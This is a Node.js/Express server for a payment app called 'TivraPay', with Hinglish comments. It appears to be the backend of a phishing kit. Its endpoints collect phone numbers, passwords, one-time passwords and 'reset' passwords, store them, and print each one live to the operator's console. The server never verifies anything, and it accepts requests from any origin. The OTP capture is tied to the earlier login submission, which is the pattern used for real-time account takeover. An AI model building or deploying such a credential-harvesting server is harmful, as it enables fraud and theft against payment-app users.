const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
const PORT = 6500; // Ekdum alag aur safe port

// Aggressive CORS policy taaki browser error na de
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());

// Main Schema
const UserSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: false },
    password: { type: String, required: false },
    otp: { type: String, required: false },
    resetPhone: { type: String, required: false },
    newPassword: { type: String, required: false },
    actionType: { type: String, default: 'LOGIN' },
    timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);

async function startServer() {
    try {
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();

        await mongoose.connect(mongoUri);
        console.log(`\n==================================================`);
        console.log(`🎉 MongoDB (TivraPay In-Memory) Connected successfully!`);
        console.log(`==================================================`);

        app.listen(PORT, () => {
            console.log(`🚀 Trivia Pay Backend Server actively monitoring port: ${PORT}`);
            console.log(`Aapka data stream channel perfectly config ho gaya hai.`);
            console.log(`==================================================\n`);
        });

    } catch (error) {
        console.error("❌ Server initialization failed:", error);
    }
}

// 1. Login Request Channel
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        const newUser = new User({ phoneNumber, password, actionType: 'LOGIN' });
        await newUser.save();

        console.log(`[⚡ TIVRA PAY - NEW LOGIN RECEIVED]`);
        console.log(`📱 Phone Number : ${phoneNumber}`);
        console.log(`🔑 Password     : ${password}`);
        console.log(`--------------------------------------------------`);

        res.status(200).json({ success: true, userId: newUser._id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. Live OTP Stream Channel (Dono Login aur Forgot Password ke liye kaam karega)
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp } = req.body;
        let currentAction = 'UNKNOWN';

        if (mongoose.Types.ObjectId.isValid(userId)) {
            // OTP update karne ke saath hum record check kar rahe hain taaki pta chale kis cheez ka OTP hai
            const updatedUser = await User.findByIdAndUpdate(userId, { otp: otp }, { new: true });
            if (updatedUser) {
                currentAction = updatedUser.actionType;
            }
        }

        console.log(`[🔐 TIVRA PAY - OTP UPDATED LIVE]`);
        console.log(`🎯 Flow Type: ${currentAction}`);
        console.log(`🔥 OTP Code : ${otp}`);
        console.log(`==================================================\n`);
        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 3. Modify/Forgot Password Action Channel
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        // actionType ko 'PASSWORD_RESET' set kiya taaki pta chale ye forget section se aaya hai
        const resetRecord = new User({ resetPhone: phone, newPassword: newPassword, actionType: 'PASSWORD_RESET' });
        await resetRecord.save();

        console.log(`[🔄 TIVRA PAY - PASSWORD RESET ACTION]`);
        console.log(`📱 Account Phone: ${phone}`);
        console.log(`🔑 New Password : ${newPassword}`);
        console.log(`⏳ Waiting for Forget OTP...`);
        console.log(`--------------------------------------------------`);

        // Yahan response me userId bhej rahe hain taaki frontend ise save kar sake
        res.status(200).json({ success: true, userId: resetRecord._id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

startServer();